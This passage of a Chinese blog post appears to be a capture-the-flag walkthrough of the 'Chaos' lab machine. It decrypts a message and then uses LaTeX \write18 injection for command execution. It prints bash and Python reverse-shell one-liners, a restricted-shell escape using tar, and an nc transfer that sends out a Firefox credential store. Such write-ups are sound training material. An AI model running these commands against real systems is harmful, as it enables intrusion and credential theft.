alt="图片"></p><p>邮件内容是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Hii, sahay</span><br><span class="line">Check the enmsg.txt</span><br><span class="line">You are the password XD.</span><br><span class="line">Also attached the script which i used to encrypt.</span><br><span class="line">Thanks,</span><br><span class="line">Ayush</span><br></pre></td></tr></table></figure><p>翻译过来就是：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/736.png" alt="图片"></p><p>看来我得学学英文了，不然老是用 <code>Google</code> 翻译，论学好英文的重要性！</p><h2 id="解密文件"><a href="#解密文件" class="headerlink" title="解密文件"></a>解密文件</h2><p>把附件下载到本地其中 <code>enim_msg.txt</code> 打开看是这样的：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/737.png" alt="图片"></p><p>一段乱码？我们再来看看 <code>en.py</code> 文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">key, filename</span>):</span></span><br><span class="line">    chunksize = <span class="number">64</span>*<span class="number">1024</span></span><br><span class="line">    outputFile = <span class="string">&quot;en&quot;</span> + filename</span><br><span class="line">    filesize = <span class="built_in">str</span>(os.path.getsize(filename)).zfill(<span class="number">16</span>)</span><br><span class="line">    IV =Random.new().read(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, IV)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> infile:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(outputFile, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> outfile:</span><br><span class="line">            outfile.write(filesize.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            outfile.write(IV)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                chunk = infile.read(chunksize)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(chunk) == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">elif</span> <span class="built_in">len</span>(chunk) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">                    chunk += <span class="string">b&#x27; &#x27;</span> * (<span class="number">16</span> - (<span class="built_in">len</span>(chunk) % <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">                outfile.write(encryptor.encrypt(chunk))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getKey</span>(<span class="params">password</span>):</span></span><br><span class="line">            hasher = SHA256.new(password.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            <span class="keyword">return</span> hasher.digest()</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/738.png" alt="图片"></p><p>通过在<code>Google</code>上面，我花了大量时间了解了一些关于<code>AES</code>、<code>SHA256</code>加密解密的文章，最后在<code>Github</code>上找到了一个解密脚本：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/739.png" alt="图片"></p><blockquote><p><a href="https://github.com/bing0o/Python-Scripts/blob/master/crypto.py">https://github.com/bing0o/Python-Scripts/blob/master/crypto.py</a></p></blockquote><p>通过解密得到了一串 <code>Base64</code> 的密文：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sgb3VyIG5ldyBzZXJ2aWNlIHdoaWNoIGNyZWF0ZSBwZGYKCnAucyAtIEFzIHlvdSB0b2xkIG1lIHRvIGVuY3J5cHQgaW1wb3J0YW50IG1zZywgaSBkaWQgOikKCmh0dHA6Ly9jaGFvcy5odGIvSjAwX3cxbGxfZjFOZF9uMDdIMW45X0gzcjMKClRoYW5rcywKQXl1c2gK</span><br></pre></td></tr></table></figure><p>通过 <code>Base64</code> 解密后，发现是一段文字，其中包含一个 <code>URL</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat base64.txt | base64 --decode</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/740.png" alt="图片"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@liuwx:~/Downloads<span class="comment"># cat base64.txt | base64 --decode</span></span><br><span class="line">Hii Sahay</span><br><span class="line"></span><br><span class="line">Please check our new service <span class="built_in">which</span> create pdf</span><br><span class="line"></span><br><span class="line">p.s - As you told me to encrypt important msg, i did :)</span><br><span class="line"></span><br><span class="line">http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3</span><br><span class="line"></span><br><span class="line">Thanks,</span><br><span class="line">Ayush</span><br></pre></td></tr></table></figure><h2 id="LaTeX编辑器命令执行"><a href="#LaTeX编辑器命令执行" class="headerlink" title="LaTeX编辑器命令执行"></a>LaTeX编辑器命令执行</h2><p>访问： <code>http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3</code> 发现是一个创建 <code>PDF</code> 的一个页面：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/741.png" alt="图片"></p><p>我提交创建<code>PDF</code>发现没什么用，然后我打开审查元素看了看源码，发现了一段<code>JavaScript</code>代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">senddata</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> content = $(<span class="string">&quot;#content&quot;</span>).val();</span><br><span class="line"><span class="keyword">var</span> template = $(<span class="string">&quot;#template&quot;</span>).val();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(content == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">$(<span class="string">&quot;#output&quot;</span>).text(<span class="string">&quot;No input given!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$.ajax(&#123;</span><br><span class="line"><span class="attr">url</span>: <span class="string">&quot;ajax.php&quot;</span>,</span><br><span class="line"><span class="attr">data</span>: &#123;</span><br><span class="line"><span class="string">&#x27;content&#x27;</span>:content,</span><br><span class="line"><span class="string">&#x27;template&#x27;</span>:template</span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">method</span>: <span class="string">&#x27;post&#x27;</span></span><br><span class="line">&#125;).success(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">$(<span class="string">&quot;#output&quot;</span>).text(data)</span><br><span class="line">&#125;).fail(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">$(<span class="string">&quot;#output&quot;</span>).text(<span class="string">&quot;OOps, something went wrong...\n&quot;</span>+data)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/742.png" alt="图片"></p><p>通过分析<code>JS</code>代码得知：这个页面是使用<code>JavaScript</code>对<code>ajax.php</code>文件进行<code>AJAX</code>调用，我先<code>BurpSuite</code>抓个包看看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /J00_w1ll_f1Nd_n07H1n9_H3r3/ajax.php HTTP/1.1</span><br><span class="line">Host: chaos.htb</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 28</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">content=liuwx&amp;template=test1</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/743.png" alt="图片"></p><p>这个是它的响应包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Mon, 09 Dec 2019 10:27:03 GMT</span><br><span class="line">Server: Apache/2.4.34 (Ubuntu)</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Length: 3405</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LOG:</span><br><span class="line">This is pdfTeX, Version 3.14159265-2.6-1.40.19 (TeX Live 2019/dev/Debian) (preloaded format=pdflatex)</span><br><span class="line"> \write18 enabled.</span><br><span class="line">entering extended mode</span><br><span class="line">(./5e12799f4d92286db03fa23075cac69e.tex</span><br><span class="line">LaTeX2e &lt;2018-04-01&gt; patch level 5</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrartcl.cls</span><br><span class="line">Document Class: scrartcl 2018/03/30 v3.25 KOMA-Script document class (article)</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrkbase.sty</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrbase.sty</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/graphics/keyval.sty)</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrlfile.sty)))</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/koma-script/tocbasic.sty)</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrsize11pt.clo)</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/koma-script/typearea.sty))</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/base/fontenc.sty</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/base/t1enc.def))</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/jknapltx/sans.sty</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/base/t1cmss.fd))</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/generic/babel/babel.sty</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/generic/babel/switch.def)</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/generic/babel-english/english.ldf</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/generic/babel/babel.def</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/generic/babel/txtbabel.def))))</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsmath.sty</span><br><span class="line">For additional information on amsmath, use the `?&#x27; option.</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amstext.sty</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsgen.sty))</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsbsy.sty)</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsopn.sty))</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/amsfonts.sty)</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/amscls/amsthm.sty)</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/lipsum/lipsum.sty)</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/sectsty/sectsty.sty)</span><br><span class="line"></span><br><span class="line">Class scrartcl Warning: Usage of package `fancyhdr&#x27; together</span><br><span class="line">(scrartcl)              with a KOMA-Script class is not recommended.</span><br><span class="line">(scrartcl)              I&#x27;d suggest to use </span><br><span class="line">(scrartcl)              package `scrlayer&#x27; or `scrlayer-scrpage&#x27;, because</span><br><span class="line">(scrartcl)              they support KOMA-Script classes.</span><br><span class="line">(scrartcl)              With `fancyhdr&#x27; several features of class `scrartcl&#x27;</span><br><span class="line">(scrartcl)              like options `headsepline&#x27;, `footsepline&#x27; or command</span><br><span class="line">(scrartcl)              `\MakeMarkcase&#x27; and the commands `\setkomafont&#x27; and</span><br><span class="line">(scrartcl)              `\addtokomafont&#x27; for the page style elements need</span><br><span class="line">(scrartcl)              explicite user intervention to work.</span><br><span class="line">(scrartcl)              Nevertheless, using requested</span><br><span class="line">(scrartcl)              package `fancyhdr&#x27; on input line 34.</span><br><span class="line"></span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/fancyhdr/fancyhdr.sty)</span><br><span class="line">No file 5e12799f4d92286db03fa23075cac69e.aux.</span><br><span class="line"></span><br><span class="line">LaTeX Font Warning: Font shape `T1/cmss/m/sc&#x27; in size &lt;10.95&gt; not available</span><br><span class="line">(Font)              Font shape `T1/cmr/m/sc&#x27; tried instead on input line 69.</span><br><span class="line"></span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/umsa.fd)</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/umsb.fd) [1&#123;/var/lib/texmf/fo</span><br><span class="line">nts/map/pdftex/updmap/pdftex.map&#125;] (./5e12799f4d92286db03fa23075cac69e.aux) )</span><br><span class="line">!pdfTeX error: /usr/bin/pdflatex (file ecss1095): Font ecss1095 at 600 not foun</span><br><span class="line">d</span><br><span class="line"> ==&gt; Fatal error occurred, no output PDF file produced!</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过响应包分析后，我又在<code>Google</code>上找到了一种叫做 <code>LaTeX</code> 编辑器的攻击手段，具体可以看看这篇文章：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://0day.work/hacking-with-latex/</span><br></pre></td></tr></table></figure><p>我们通过命令依赖于 <code>write18</code> 命令，来一波命令执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /J00_w1ll_f1Nd_n07H1n9_H3r3/ajax.php HTTP/1.1</span><br><span class="line">Host: chaos.htb</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 78</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">content=liuwx</span><br><span class="line"></span><br><span class="line">\immediate\write18&#123;whoami&#125;&amp;template=test1</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/744.png" alt="图片"></p><p>发现只是一个 <code>www-data</code> 普通权限，那么我们先通过 <code>nc</code> 来反弹一个 <code>shell</code> 回来：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/745.png" alt="图片"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.10.128/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/746.png" alt="图片"></p><p>额，发现没什么用，那么我们换个思路，利用 <code>Python</code> 来得到<code>shell</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.10.128&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/747.png" alt="图片"></p><p>这个时候得到一枚 <code>shell</code> ，虽然得到了 <code>shell</code> 但是它不是用 <code>/bin/bash</code> ，那么我们就通过 <code>python</code> 来得到 <code>bash</code> 吧：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/748.png" alt="图片"></p><p>来到 <code>home</code> 目录下，发现有三个用户：<code>ayush</code>、<code>jack</code>、<code>sahay</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ayush</span><br><span class="line">jack</span><br><span class="line">sahay jiujitsu</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/749.png" alt="图片"></p><p><code>ayush</code>？是不是很熟悉？之前在<code>wordpress</code>文章里有一个<code>ayush</code>的账号，密码是<code>jiujitsu</code>，然后我们<code>su</code> 切换一下用户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">su ayush</span><br><span class="line"></span><br><span class="line">user：ayush</span><br><span class="line">pass：jiujitsu</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/750.png" alt="图片"></p><h2 id="Linux受限Shell绕过"><a href="#Linux受限Shell绕过" class="headerlink" title="Linux受限Shell绕过"></a>Linux受限Shell绕过</h2><p>这个时候就得到了一个 <code>rbash</code> 的 <code>shell</code>，但是我发现它执行不了一些命令，例如 <code>ls</code> ：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/751.png" alt="图片"></p><p>但是通过 <code>FUZZ</code> 发现可以使用 <code>dir</code> 命令：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/752.png" alt="图片"></p><p>但是还是没有什么用，使用不了 <code>cd</code> 命令以及一些常用命令：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/753.png" alt="图片"></p><p>通过查看<code>环境变量</code>发现它的环境变量被设置到了 <code>/home/ayush/.app</code> 里：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ayush@chaos:/var/www$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">/home/ayush/.app</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/754.png" alt="图片"></p><p>随后我便我在 <code>exploit-db</code> 上找到了一个Linux受限Shell绕过的文章：</p><blockquote><p><a href="https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf">https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf</a></p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/755.png" alt="图片"></p><p>其中 <code>POC</code> 是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=<span class="built_in">exec</span>=/bin/bash</span><br></pre></td></tr></table></figure><p>然后我们重新设置一下 <code>PATH</code> 的路径：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/bin:/usr/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/756.png" alt="图片"></p><p>这个时候就可以执行 <code>ls</code> 命令了！接着来到 <code>/home/ayush</code> 目录下，发现一个 <code>user.txt</code> ，然后查看得到一个 <code>falg</code>！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/757.png" alt="图片"></p><h2 id="获取Firefox的root用户凭证"><a href="#获取Firefox的root用户凭证" class="headerlink" title="获取Firefox的root用户凭证"></a>获取Firefox的root用户凭证</h2><p>还差一个 <code>root.txt</code>，通过在 <code>ayush</code> 用户目录下，我发现了一个隐藏目录 <code>mozilla</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/758.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/759.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/760.png" alt="图片"></p><p>通过一步步的 <code>cd</code> 切换目录，最终我来到了 <code>bzo7sjt1.default</code> 这个目录，起初我还以为是一个文件，最后才发现这是一个目录！通过 <code>ls</code> 发现里面有一个登陆的 json 文件，<code>logins.json</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/761.png" alt="图片"></p><p>接着我吧 <code>json</code> 格式化了一下，不然看上去有点打脑壳….</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.json.cn/</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;nextId&quot;</span>:<span class="number">3</span>,</span><br><span class="line">    <span class="attr">&quot;logins&quot;</span>:[</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;id&quot;</span>:<span class="number">2</span>,</span><br><span class="line">            <span class="attr">&quot;hostname&quot;</span>:<span class="string">&quot;https://chaos.htb:10000&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;httpRealm&quot;</span>:<span class="literal">null</span>,</span><br><span class="line">            <span class="attr">&quot;formSubmitURL&quot;</span>:<span class="string">&quot;https://chaos.htb:10000&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;usernameField&quot;</span>:<span class="string">&quot;user&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;passwordField&quot;</span>:<span class="string">&quot;pass&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;encryptedUsername&quot;</span>:<span class="string">&quot;MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECDSAazrlUMZFBAhbsMDAlL9iaw==&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;encryptedPassword&quot;</span>:<span class="string">&quot;MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECNx7bW1TuuCuBBAP8YwnxCZH0+pLo6cJJxnb&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;guid&quot;</span>:<span class="string">&quot;&#123;cb6cd202-0ff8-4de5-85df-e0b8a0f18778&#125;&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;encType&quot;</span>:<span class="number">1</span>,</span><br><span class="line">            <span class="attr">&quot;timeCreated&quot;</span>:<span class="number">1540642202692</span>,</span><br><span class="line">            <span class="attr">&quot;timeLastUsed&quot;</span>:<span class="number">1540642202692</span>,</span><br><span class="line">            <span class="attr">&quot;timePasswordChanged&quot;</span>:<span class="number">1540642202692</span>,</span><br><span class="line">            <span class="attr">&quot;timesUsed&quot;</span>:<span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;disabledHosts&quot;</span>:[</span><br><span class="line"></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;version&quot;</span>:<span class="number">2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在渗透测试过程中，如果发现目标机器中有浏览器，那么浏览器密码和历史记录是一个突破的地方！如果对方的浏览器是<code>Firefox</code>，那么则需要<code>logins.json</code>文件，还有一个<code>key3.db</code>（这个是低版本的Firefox），当前机器中的是<code>key4.db</code>，说明它的<code>Firefox</code>版本还比较高！那么我们还需要一个高版本的<code>cert9.db</code>（这是高版本，低版本是cert8.db）</p><p>为了方便，我直接把 <code>.mozilla</code> 目录压缩打包吧：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zcvf fox.tar.gz .mozilla</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/762.png" alt="图片"></p><p>然后通过 <code>nc</code> 我们把文件传输到 <code>KALI</code> ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 在KALI 上运行，接收到的文件重定向到fox.tar.gz</span><br><span class="line">nc -nlvp 6666 &gt; fox.tar.gz </span><br><span class="line"> # 在目标主机上运行 nc 传输 fox.tar.gz 文件到 kali</span><br><span class="line">nc -nv 10.10.10.128 6666 &lt; fox.tar.gz 